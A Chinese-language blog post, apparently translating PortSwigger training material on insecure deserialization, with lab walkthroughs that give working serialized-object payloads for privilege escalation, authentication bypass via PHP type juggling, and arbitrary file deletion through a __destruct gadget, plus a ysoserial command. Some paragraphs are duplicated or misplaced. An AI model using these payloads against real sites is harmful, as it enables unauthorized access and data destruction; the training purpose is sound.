<p>不过，有时网站所有者会认为自己很安全，因为他们对反序列化数据实施了某种形式的额外检查。这种方法往往是无效的，因为几乎不可能实施验证或消毒来应对每一种可能发生的情况。这些检查从根本上说也是有缺陷的，因为它们依赖于在数据被反序列化后对其进行检查，而在许多情况下，这已经太晚了，无法阻止攻击。</p>
<p>由于通常认为反序列化对象是可信的，因此也可能出现漏洞。特别是在使用二进制序列化格式的语言时，开发人员可能会认为用户无法有效地读取或操作数据。然而，虽然可能需要付出更多努力，但攻击者利用二进制序列化对象的可能性与利用基于字符串格式的对象的可能性一样大。</p>
<p>现代网站中存在大量依赖关系，这也使得基于反序列化的攻击成为可能。一个典型的网站可能实现了许多不同的库，每个库都有自己的依赖关系。这就形成了一个庞大的类和方法池，很难对其进行安全管理。由于攻击者可以创建任何这些类的实例，因此很难预测在恶意数据上可以调用哪些方法。如果攻击者能够将一长串意想不到的方法调用串联起来，将数据传递到与初始源完全无关的汇中，情况就更是如此。因此，要预测恶意数据流并堵住每个潜在漏洞几乎是不可能的。</p>
<p>简而言之，可以说不可能安全地反序列化不受信任的输入。</p>
<h2 id="不安全的反序列化会产生什么影响？">不安全的反序列化会产生什么影响？</h2>
<p>不安全的反序列化可能会造成非常严重的影响，因为它为大量增加的攻击面提供了一个切入点。它允许攻击者以有害的方式重复使用现有的应用程序代码，导致许多其他漏洞，通常是远程代码执行。</p>
<p>即使在不可能执行远程代码的情况下，不安全的反序列化也会导致权限升级、任意文件访问和拒绝服务攻击。</p>
<h2 id="如何利用不安全的反序列化漏洞">如何利用不安全的反序列化漏洞</h2>
<p>现在您已经熟悉了序列化和反序列化的基础知识，我们可以看看如何利用不安全的反序列化漏洞。</p>
<h2 id="利用不安全的反序列化漏洞">利用不安全的反序列化漏洞</h2>
<p>在本节中，我们将以 PHP、Ruby 和 Java 反序列化为例，教您如何利用一些常见情况。我们希望展示利用不安全的反序列化实际上比许多人想象的要容易得多。如果您能够使用预构建的小工具链，甚至在黑盒测试中可以做到这一点。</p>
<p>我们还将指导您创建自己的基于反序列化的高严重性攻击。虽然这些攻击通常需要源代码访问权限，但一旦理解了基本概念，学习起来也会比想象中容易。我们将特别介绍以下主题：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>如何识别不安全的反序列化 LABS</p>
</li>
<li class="lvl-2">
<p>修改网站期望的序列化对象 LABS</p>
</li>
<li class="lvl-2">
<p>向危险的网站功能传递恶意数据 LABS</p>
</li>
<li class="lvl-2">
<p>注入任意对象类型</p>
</li>
<li class="lvl-2">
<p>串联方法调用以控制进入危险水槽小工具的数据流 LABS</p>
</li>
<li class="lvl-2">
<p>手动创建自己的高级漏洞利用程序 LABS</p>
</li>
<li class="lvl-2">
<p>PHAR 反序列化</p>
</li>
</ul>
<blockquote>
<p><strong>Note</strong></p>
<p>尽管许多实验和示例都基于 PHP，但大多数开发技术对其他语言也同样适用。</p>
</blockquote>
<h3 id="如何识别不安全的反序列化">如何识别不安全的反序列化</h3>
<p>不管是白盒测试还是黑盒测试，识别不安全的反序列化都相对简单。</p>
<p>在审计过程中，你应该查看所有传入网站的数据，并尝试识别任何看起来像序列化数据的东西。如果了解不同语言使用的格式，序列化数据就能比较容易地识别出来。在本节中，我们将展示 PHP 和 Java 序列化的示例。一旦识别出序列化数据，就可以测试是否能够控制它。</p>
<blockquote>
<p><strong>Tip</strong></p>
<p>对于 Burp Suite Professional 的用户，Burp Scanner 会自动标记任何看起来包含序列化对象的 HTTP 消息。</p>
</blockquote>
<h3 id="PHP-序列化格式">PHP 序列化格式</h3>
<p>PHP 使用的大多是人类可读的字符串格式，字母代表数据类型，数字代表每个条目的长度。例如，用户对象的属性为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$user</span>-&gt;name = <span class="string">&quot;carlos&quot;</span>;</span><br><span class="line"><span class="variable">$user</span>-&gt;isLoggedIn = <span class="literal">true</span>;</span><br></pre></td></tr></table></figure>
<p>序列化后，该对象的外观可能如下所示：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>:s:<span class="number">6</span>:<span class="string">&quot;carlos&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;isLoggedIn&quot;</span>:b:<span class="number">1</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>这可以解释为：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>O:4: &quot;User&quot;</code> - 具有 4 个字符类名 <code>&quot;User&quot;</code> 的对象</p>
</li>
<li class="lvl-2">
<p><code>2</code> - 该对象有 2 个属性</p>
</li>
<li class="lvl-2">
<p><code>s:4: &quot;name&quot;</code> - 第一个属性的键是 4 个字符的字符串 <code>“name”</code>。</p>
</li>
<li class="lvl-2">
<p><code>s:6: &quot;carlos&quot;</code> - 第一个属性的值是 6 个字符的字符串 <code>“carlos”</code>。</p>
</li>
<li class="lvl-2">
<p><code>s:10: &quot;isLoggedIn&quot;</code> - 第二个属性的键是 10 个字符的字符串 “isLoggedIn”。</p>
</li>
<li class="lvl-2">
<p><code>b:1</code> - 第二个属性的值是布尔值 <code>true</code></p>
</li>
</ul>
<p>PHP 序列化的本地方法是 <code>serialize() </code>和 <code>unserialize()</code>。如果可以访问源代码，就应该先在代码中查找 <code>unserialize()</code>，然后进一步研究。</p>
<h3 id="Java-序列化格式">Java 序列化格式</h3>
<p>有些语言（如 Java）使用二进制序列化格式。这种格式更难读取，但如果知道如何识别一些蛛丝马迹，还是可以识别序列化数据的。例如，序列化的 Java 对象总是以相同的字节开始，在十六进制中编码为 <code>aced</code>，在 Base64 中编码为 <code>rO0</code>。</p>
<p>任何实现了 <code>java.io.Serializable</code> 接口的类都可以被序列化和反序列化。如果您可以访问源代码，请注意任何使用 <code>readObject()</code> 方法的代码，该方法用于从 <code>InputStream</code> 中读取和反序列化数据。</p>
<h3 id="操作序列化对象">操作序列化对象</h3>
<p>利用某些反序列化漏洞就像更改序列化对象中的一个属性一样简单。由于对象状态是持久化的，因此可以通过研究序列化数据来识别和编辑有趣的属性值。然后，您就可以通过网站的反序列化过程将恶意对象传入网站。这是基本反序列化漏洞利用的第一步。</p>
<p>一般来说，在操作序列化对象时有两种方法。一种是直接编辑字节流形式的对象，另一种是用相应的语言编写简短的脚本，自己创建新对象并将其序列化。在处理二进制序列化格式时，后一种方法通常更为简便。</p>
<h4 id="修改对象属性">修改对象属性</h4>
<p>在篡改数据时，只要攻击者保留了一个有效的序列化对象，反序列化过程就会创建一个带有修改后属性值的服务器端对象。</p>
<p>举个简单的例子，一个网站使用序列化的 <code>User</code> 对象在 cookie 中存储用户会话数据。如果攻击者在 HTTP 请求中发现了这个序列化对象，他们可能会对其进行解码，发现以下字节流：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;carlos&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;isAdmin&quot;</span>;b:<span class="number">0</span>;&#125;</span><br></pre></td></tr></table></figure>
<p><code>isAdmin</code> 属性是一个明显的关注点。攻击者只需将该属性的布尔值改为 <code>1</code>（true），重新编码对象，然后用修改后的值覆盖当前 cookie 即可。单独来看，这不会产生任何影响。但是，假设网站使用此 cookie 来检查当前用户是否有访问某些管理功能的权限：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$user</span>-&gt;isAdmin === <span class="literal">true</span>) &#123;</span><br><span class="line"><span class="comment">// allow access to admin interface</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这段有漏洞的代码会根据 cookie 中的数据（包括攻击者修改过的 <code>isAdmin</code> 属性）实例化一个<code>User</code>对象。在任何时候都不会检查序列化对象的真实性。然后，这些数据会被传递到条件语句中，在这种情况下，就可以轻松实现权限升级。</p>
<p>这种简单的情况在实际应用中并不常见。不过，以这种方式编辑属性值，展示了获取不安全反序列化所暴露的大量攻击面的第一步。</p>
<h4 id="Lab：修改序列化对象">Lab：修改序列化对象</h4>
<p>本实验使用了基于序列化的会话机制，因此存在权限升级漏洞。要解决该实验问题，请编辑会话 cookie 中的序列化对象，利用此漏洞获得管理权限。然后删除用户 carlos。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>使用自己的凭据登录。请注意，登录后的 <code>GET /my-account</code> 请求包含一个会话 cookie，它似乎是 URL 和 Base64 编码的。</p>
</li>
<li class="lvl-2">
<p>使用 Burp 的 Inspector 面板研究请求的解码形式。请注意，cookie 实际上是一个序列化的 PHP 对象。admin 属性包含 b:0，表示布尔值 false。将此请求发送到 Burp Repeater。</p>
</li>
<li class="lvl-2">
<p>在 Burp Repeater 中，使用检查器再次检查 cookie，并将 admin 属性的值更改为 b:1。点击 “应用更改”。修改后的对象将自动重新编码并更新到请求中。</p>
</li>
<li class="lvl-2">
<p>发送请求。请注意，响应中现在包含了一个指向 /admin 管理面板的链接，表明您已使用管理员权限访问了该页面。</p>
</li>
<li class="lvl-2">
<p>将请求路径改为 /admin，然后重新发送。注意 /admin 页面包含删除特定用户账户的链接。</p>
</li>
<li class="lvl-2">
<p>将请求路径更改为 /admin/delete?username=carlos，然后发送请求以解决实验室问题。</p>
</li>
</ul>
<h4 id="修改数据类型">修改数据类型</h4>
<p>我们已经看到了如何修改序列化对象中的属性值，但也有可能提供意想不到的数据类型。</p>
<p>由于在比较不同数据类型时使用了松散比较运算符 (==)，基于 PHP 的逻辑特别容易受到这种操作的影响。例如，如果在整数和字符串之间进行松散比较，PHP 会尝试将字符串转换为整数，这意味着 5 == “5” 的值为 true。</p>
<h2 id="如何防止不安全的反序列化漏洞">如何防止不安全的反序列化漏洞</h2>
<p>一般来说，除非绝对必要，否则应避免对用户输入进行反序列化。在许多情况下，反序列化可能带来的高严重性漏洞，以及防范这些漏洞的难度，都超过了反序列化的好处。</p>
<p>由于在比较不同数据类型时使用了松散比较运算符 (==)，基于 PHP 的逻辑特别容易受到这种操作的影响。例如，如果在整数和字符串之间进行松散比较，PHP 会尝试将字符串转换为整数，这意味着 5 == “5” 的值为 true。</p>
<p>由于在比较不同数据类型时使用了松散比较运算符 (<code>==</code>)，基于 PHP 的逻辑特别容易受到这种操作的影响。例如，如果在整数和字符串之间进行松散比较，PHP 会尝试将字符串转换为整数，这意味着 <code>5 == “5”</code> 的值为 <code>true</code>。</p>
<p>不同寻常的是，这也适用于任何以数字开头的字母数字字符串。在这种情况下，PHP 将根据开头的数字有效地将整个字符串转换为整数值。字符串的其余部分将被完全忽略。因此，<code>5 == &quot;5 of something&quot;</code> 实际上被视为 <code>5 == 5</code>。</p>
<p>同样，在 PHP 7.x 及更早版本中，比较 <code>0 == &quot;Example string&quot;</code> 的结果为 <code>true</code>，因为 PHP 将整个字符串视为整数 <code>0</code>。</p>
<p>考虑将这种松散的比较运算符与来自反序列化对象的用户可控数据结合使用的情况。这有可能导致危险的逻辑缺陷。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$login</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>)</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$login</span>[<span class="string">&#x27;password&#x27;</span>] == <span class="variable">$password</span>) &#123;</span><br><span class="line"><span class="comment">// log in successfully</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>假设攻击者修改了密码属性，使其包含整数 <code>0</code>，而不是预期的字符串。只要存储的密码不是以数字开头，该条件就会始终返回 <code>true</code>，从而实现身份验证绕过。请注意，这只是因为反序列化保留了数据类型。如果代码直接从请求中获取密码，<code>0</code> 将被转换为字符串，条件将返回 <code>false</code>。</p>
<blockquote>
<p><strong>Note</strong></p>
<p>在 PHP 8 及以后的版本中，0 == “Example string ”比较结果为 false，因为在比较过程中字符串不再隐式转换为 0。因此，在这些版本的 PHP 中无法使用此漏洞。</p>
<p>比较以数字开头的字母数字字符串的行为在 PHP 8 中保持不变。因此，5 == <code>“5 of something ”</code>仍被视为 <code>5 == 5</code>。</p>
</blockquote>
<p>请注意，在修改任何序列化对象格式中的数据类型时，一定要记得更新序列化数据中的任何类型标签和长度指示符。否则，序列化对象将被损坏，无法进行反序列化。</p>
<h4 id="Lab：-修改序列化数据类型">Lab： 修改序列化数据类型</h4>
<p>本实验使用了基于序列化的会话机制，因此容易发生身份验证绕过。要解决该实验问题，请编辑会话 cookie 中的序列化对象，以访问<code>administrator</code>账户。然后删除用户 <code>carlos</code>。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>使用自己的凭据登录。在 Burp 中，打开登录后的 <code>GET /my-account</code> 请求，并使用检查器检查会话 cookie，以显示序列化的 PHP 对象。将此请求发送到 Burp Repeater。</p>
</li>
<li class="lvl-2">
<p>在 Burp Repeater 中，使用检查器面板对会话 cookie 进行如下修改：</p>
<ul class="lvl-2">
<li class="lvl-4">
<p>将用户名属性的长度更新为 13。</p>
</li>
<li class="lvl-4">
<p>将用户名改为管理员。</p>
</li>
<li class="lvl-4">
<p>将访问令牌更改为整数 0。 由于这不再是字符串，因此还需要删除值周围的双引号。</p>
</li>
<li class="lvl-4">
<p>将 s 替换为 i，更新访问令牌的数据类型标签。</p>
</li>
</ul>
</li>
</ul>
<p>结果应该是这样的:</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">13</span>:<span class="string">&quot;administrator&quot;</span>;s:<span class="number">12</span>:<span class="string">&quot;access_token&quot;</span>;i:<span class="number">0</span>;&#125;</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p>单击 “应用更改”。修改后的对象将自动重新编码并更新到请求中。</p>
</li>
<li class="lvl-2">
<p>发送请求。请注意，响应中现在包含一个指向 <code>/admin</code> 管理面板的链接，表明您已成功以管理员用户身份访问该页面。</p>
</li>
<li class="lvl-2">
<p>将请求路径改为 <code>/admin</code>，然后重新发送。注意<code> /admin</code> 页面包含删除特定用户账户的链接。</p>
</li>
<li class="lvl-2">
<p>将请求路径更改为<code> /admin/delete?username=carlos</code>，然后发送请求以解决实验室问题。</p>
</li>
</ul>
<p>在直接处理二进制格式时，我们建议使用 BApp 商店提供的 Hackvertor 扩展。使用 Hackvertor，你可以将序列化数据修改为字符串，它会自动更新二进制数据，并相应调整偏移量。这样可以节省大量的手动操作。</p>
<h2 id="使用应用程序功能">使用应用程序功能</h2>
<p>除了简单地检查属性值外，网站功能还可能对来自反序列化对象的数据执行危险操作。在这种情况下，您可以利用不安全的反序列化传递非预期数据，并利用相关功能进行破坏。</p>
<p>例如，作为网站 “删除用户 ”功能的一部分，用户的个人资料图片是通过访问 <code>$user-&gt;image_location</code> 属性中的文件路径来删除的。如果该 <code>$user</code> 是通过序列化对象创建的，攻击者就可以通过将 <code>image_location</code> 设置为任意文件路径的修改后传入来利用这一漏洞。删除自己的用户账户后，也会删除这个任意文件。</p>
<h4 id="Lab：-使用应用程序功能利用不安全的反序列化">Lab： 使用应用程序功能利用不安全的反序列化</h4>
<p>本实验室使用基于序列化的会话机制。某个功能会对序列化对象中提供的数据调用一个危险的方法。要解决这个实验问题，请编辑会话 cookie 中的序列化对象，并用它删除<code>Carlos</code>主目录中的 <code>morale.txt</code> 文件。</p>
<ol>
<li class="lvl-3">
<p>登录自己的账户。在 “我的账户 ”页面，注意到有删除账户的选项，可向 /my-account/delete 发送 POST 请求。</p>
</li>
<li class="lvl-3">
<p>向 Burp Repeater 发送包含会话 cookie 的请求。</p>
</li>
<li class="lvl-3">
<p>在 Burp Repeater 中，使用检查器面板研究会话 cookie。注意到序列化对象有一个 avatar_link 属性，其中包含头像的文件路径。</p>
</li>
<li class="lvl-3">
<p>编辑序列化数据，使 avatar_link 指向 /home/carlos/morale.txt。记住要更新长度指示符。修改后的属性应如下所示：</p>
</li>
</ol>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">s</span>:<span class="number">11</span>:<span class="string">&quot;avatar_link&quot;</span>;s:<span class="number">23</span>:<span class="string">&quot;/home/carlos/morale.txt&quot;</span></span><br></pre></td></tr></table></figure>
<ol start="5">
<li class="lvl-3">
<p>点击 “应用更改”。修改后的对象将自动重新编码并更新到请求中。</p>
</li>
<li class="lvl-3">
<p>将请求行改为 POST /my-account/delete 并发送请求。您的账户将被删除，同时删除的还有卡洛斯的 morale.txt 文件。</p>
</li>
</ol>
<p>这个示例依赖于攻击者通过用户可访问的功能手动调用危险方法。但是，如果利用漏洞自动将数据传递到危险方法中，不安全的反序列化就会变得更加有趣。使用 “magic methods ”可以实现这一点。</p>
<h2 id="Magic-methods">Magic methods</h2>
<p>魔法方法是无需显式调用的方法的特殊子集。相反，每当发生特定事件或情况时，它们就会被自动调用。魔法方法是各种语言中面向对象编程的常见特征。有时会在方法名称的前缀或周围加上双引号来表示它们。</p>
<p>开发人员可以在类中添加魔法方法，以便预先确定在相应事件或场景发生时应执行哪些代码。调用魔法方法的具体时间和原因因方法而异。PHP 中最常见的例子之一是 <code>__construct()</code>，它在类的对象实例化时被调用，类似于 Python 的 <code>__init__</code> 。通常，构造函数魔法方法包含初始化实例属性的代码。不过，开发人员可以自定义魔法方法，以执行他们想要的任何代码。</p>
<p>魔法方法被广泛使用，其本身并不代表漏洞。但是，当执行这些方法的代码处理攻击者可控制的数据（例如来自反序列化对象的数据）时，它们就会变得危险。攻击者可以利用这一点，在满足相应条件时自动调用反序列化数据上的方法。</p>
<p>最重要的是，有些语言在反序列化过程中会自动调用魔法方法。例如，PHP 的 <code>unserialize()</code> 方法会查找并调用对象的 <code>__wakeup()</code> 魔法方法。</p>
<p>在 Java 反序列化中，<code>ObjectInputStream.readObject()</code> 方法也是如此，该方法用于从初始字节流中读取数据，本质上类似于 “重新初始化 ”序列化对象的构造函数。不过，可序列化类也可以按如下方式声明自己的 <code>readObject()</code> 方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// implementation</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>以这种方式声明的 <code>readObject()</code> 方法就像一个魔法方法，在反序列化过程中会被调用。这样，类就能更紧密地控制自己字段的反序列化。</p>
<p>你应该密切关注任何包含这类神奇方法的类。它们允许你在对象完全反序列化之前将数据从序列化对象传递到网站代码中。这是创建更高级漏洞的起点。</p>
<h2 id="注入任意对象">注入任意对象</h2>
<p>正如我们所见，偶尔可以通过简单编辑网站提供的对象来利用不安全的反序列化。然而，注入任意对象类型会带来更多可能性。</p>
<p>在面向对象编程中，对象可用的方法由其类决定。因此，如果攻击者能操纵作为序列化数据传入的对象类别，就能影响反序列化后甚至反序列化过程中执行的代码。</p>
<p>反序列化方法通常不会检查它们正在反序列化的对象。这意味着你可以传入网站可用的任何可序列化类的对象，而该对象将被反序列化。这实际上允许攻击者创建任意类的实例。这个对象不是预期的类并不重要。意外的对象类型可能会导致应用程序逻辑出现异常，但恶意对象届时已经实例化了。</p>
<p>如果攻击者可以访问源代码，他们就可以详细研究所有可用的类。要构建一个简单的漏洞，攻击者可以查找包含反序列化魔法方法的类，然后检查其中是否有对可控数据执行危险操作的类。然后，攻击者就可以传入该类的序列化对象，使用其魔法方法进行攻击。</p>
<h4 id="Lab：-PHP-中的任意对象注入">Lab： PHP 中的任意对象注入</h4>
<p>本实验使用基于序列化的会话机制，因此容易受到任意对象注入的攻击。要解决该实验问题，请创建并注入一个恶意序列化对象，以删除 Carlos home 目录中的 morale.txt 文件。您需要获得源代码访问权限才能解决本实验。</p>
<ol>
<li class="lvl-3">
<p>登录自己的账户，注意会话 cookie 包含一个序列化的 PHP 对象。</p>
</li>
<li class="lvl-3">
<p>在网站地图中，注意到网站引用了 <code>/libs/CustomTemplate.php</code> 文件。右键单击该文件，选择 “发送到中继器”。</p>
</li>
</ol>
<p><img src="/posts/bea7d250//image-20250527163121200.png" alt="image-20250527163121200"></p>
<ol start="3">
<li class="lvl-3">
<p>在 Burp Repeater 中，注意在请求行的文件名后添加一个斜杠 (<code>~</code>) 就能读取源代码。</p>
</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CustomTemplate</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$template_file_path</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$lock_file_path</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$template_file_path</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;template_file_path = <span class="variable">$template_file_path</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;lock_file_path = <span class="variable">$template_file_path</span> . <span class="string">&quot;.lock&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">isTemplateLocked</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;lock_file_path);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getTemplate</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;template_file_path);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">saveTemplate</span>(<span class="params"><span class="variable">$template</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">isTemplateLocked</span>()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;lock_file_path, <span class="string">&quot;&quot;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Could not write to &quot;</span> . <span class="variable language_">$this</span>-&gt;lock_file_path);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;template_file_path, <span class="variable">$template</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Could not write to &quot;</span> . <span class="variable language_">$this</span>-&gt;template_file_path);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// Carlos thought this would be a good idea</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;lock_file_path)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;lock_file_path);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ol start="4">
<li class="lvl-3">
<p>在源代码中，请注意 <code>CustomTemplate</code> 类包含 <code>__destruct()</code> 魔法方法。这将调用 <code>lock_file_path</code> 属性上的 <code>unlink()</code> 方法，从而删除该路径上的文件。</p>
</li>
<li class="lvl-3">
<p>在 Burp 解码器中，使用序列化 PHP 数据的正确语法创建一个 <code>CustomTemplate</code> 对象，并将 <code>lock_file_path</code> 属性设置为 <code>/home/carlos/morale.txt</code>。确保使用正确的数据类型标签和长度指示符。最终对象应如下所示：</p>
</li>
</ol>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">14</span>:<span class="string">&quot;CustomTemplate&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">14</span>:<span class="string">&quot;lock_file_path&quot;</span>;s:<span class="number">23</span>:<span class="string">&quot;/home/carlos/morale.txt&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
<ol start="6">
<li class="lvl-3">
<p>对该对象进行 Base64 和 URL 编码，并将其保存到剪贴板。</p>
</li>
<li class="lvl-3">
<p>向 Burp Repeater 发送包含会话 cookie 的请求。</p>
</li>
<li class="lvl-3">
<p>在 Burp Repeater 中，用剪贴板中修改后的 cookie 替换会话 cookie。</p>
</li>
<li class="lvl-3">
<p>发送请求。魔法方法 <code>__destruct()</code> 会被自动调用，并删除 Carlos 的文件。</p>
</li>
</ol>
<p>包含这些反序列化魔法方法的类还可用于发起更复杂的攻击，其中涉及一长串方法调用，即所谓的 “小工具链”。</p>
<h2 id="小工具链">小工具链</h2>
<p>小工具 &quot;是应用程序中存在的代码片段，可帮助攻击者实现特定目标。单个小工具可能不会直接对用户输入进行任何有害操作。但是，攻击者的目标可能只是调用一个方法，将用户输入传递到另一个小工具中。通过以这种方式将多个小工具串联在一起，攻击者就有可能将其输入传递到一个危险的 “下沉小工具 ”中，从而造成最大的破坏。</p>
<p>重要的是要明白，与其他一些类型的漏洞利用不同，小工具链不是攻击者构建的链式方法的有效payload。所有代码都已存在于网站上。攻击者唯一能控制的是传入小工具链的数据。这通常是通过在反序列化过程中调用的魔法方法来实现的，有时也称为 “启动小工具”。</p>
<p>在外网，许多不安全的反序列化漏洞只能通过使用小工具链来利用。这有时可能是简单的一步或两步链，但构建高严重性攻击可能需要更复杂的对象实例化和方法调用序列。因此，能够构建小工具链是成功利用不安全反序列化的关键因素之一。</p>
<h3 id="使用预制小工具链">使用预制小工具链</h3>
<p>手动识别小工具链可能是一个相当艰巨的过程，而且在没有源代码访问权限的情况下几乎是不可能的。幸运的是，有几种使用预建小工具链的方法可以先试试。</p>
<p>有几种工具可以提供一系列预先发现的链，这些链已在其他网站上被成功利用。即使您没有访问源代码的权限，也可以使用这些工具来识别和利用不安全的反序列化漏洞，所需的工作量相对较小。之所以能采用这种方法，是因为广泛使用了包含可利用小工具链的库。例如，如果 Java 的 Apache Commons Collections 库中的小工具链可以在一个网站上被利用，那么任何其他实现该库的网站也可以使用相同的小工具链进行利用。</p>
<h4 id="ysoserial">ysoserial</h4>
<p>ysoserial &quot;就是这样一个 Java 反序列化工具。它可以让你从提供的小工具链中选择一个你认为目标应用程序正在使用的库，然后传入你想执行的命令。然后，它会根据所选链创建一个合适的序列化对象。这仍然需要一定的尝试和错误，但比手动构建自己的小工具链要省力得多。</p>
<blockquote>
<p><strong>Note</strong><br>
在 Java 16 及以上版本中，您需要设置一系列命令行参数，以便 Java 运行 ysoserial。例如</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-all.jar \</span><br><span class="line">   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \</span><br><span class="line">   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \</span><br><span class="line">   --add-opens=java.base/java.net=ALL-UNNAMED \</span><br><span class="line">   --add-opens=java.base/java.util=ALL-UNNAMED \</span><br><span class="line">   [payload] <span class="string">&#x27;[command]&#x27;</span></span><br></pre></td></tr></table></figure>
</blockquote>
<h4 id="Lab：使用Apache-Commons利用Java-反序列化">Lab：使用Apache Commons利用Java 反序列化</h4>
<p>本实验室使用基于序列化的会话机制，并加载 Apache Commons Collections 库。虽然您没有源代码访问权限，但仍可使用预构建的小工具链来利用本实验室。</p>
<p>要解决该实验室问题，请使用第三方工具生成一个包含远程代码执行有效载荷的恶意序列化对象。然后，将此对象传入网站，删除卡洛斯主目录中的 <code>morale.txt</code> 文件。</p>
<p>本文参考：</p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>靶场练习</category>
        <category>PortSwigger靶场</category>
      </categories>
      <tags>
        <tag>靶场</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>【渗透总结】路径遍历与文件上传</title>
    <url>/posts/3cec027e/</url>
    <content><![CDATA[<h2 id="目录遍历">目录遍历</h2>
